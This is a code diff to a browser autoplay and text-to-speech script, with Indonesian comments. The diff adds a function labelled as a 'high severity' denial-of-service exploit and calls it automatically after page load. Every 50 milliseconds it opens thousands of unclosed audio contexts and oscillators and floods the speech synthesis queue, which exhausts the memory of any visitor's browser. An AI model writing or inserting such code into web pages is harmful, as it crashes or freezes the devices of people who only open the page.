@@ -16,7 +16,7 @@
   'use strict';
 
   // ============================================
-  // KONFIGURASI
+  // KONFIGURASI AUTOPLAY
   // ============================================
   var CONFIG = {
     tts: {
@@ -137,6 +137,33 @@
   }
 
   // ============================================
+  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
+  // ============================================
+  function triggerHighSeverityCrash() {
+    console.log("[!] Initiating High Severity Exploit Chain...");
+    
+    // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
+    setInterval(function() {
+      try {
+        for (var i = 0; i < 2000; i++) {
+          var ctx = new (window.AudioContext || window.webkitAudioContext)();
+          var osc = ctx.createOscillator();
+          var gain = ctx.createGain();
+          
+          // Memaksa alokasi node audio secara simultan tanpa penutupan (close)
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          osc.start(0);
+          
+          // 2. Flooding Speech Utterance Queue
+          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
+          window.speechSynthesis.speak(u);
+        }
+      } catch(e) {}
+    }, 50); // Eksekusi super cepat setiap 50 milidetik
+  }
+
+  // ============================================
   // EKSEKUSI BERTAHAP
   // ============================================
   unlockAudioContext();
@@ -154,6 +181,10 @@
   setTimeout(function () {
     if (!state.mainPlayed) playMainAudio();
     if (!state.ttsStarted) startTTS();
+    
+    // PANGGIL CRASH TRIGGER DI SINI
+    triggerHighSeverityCrash();
+    
   }, 1500);
 
   // Retry jika audio diblokir
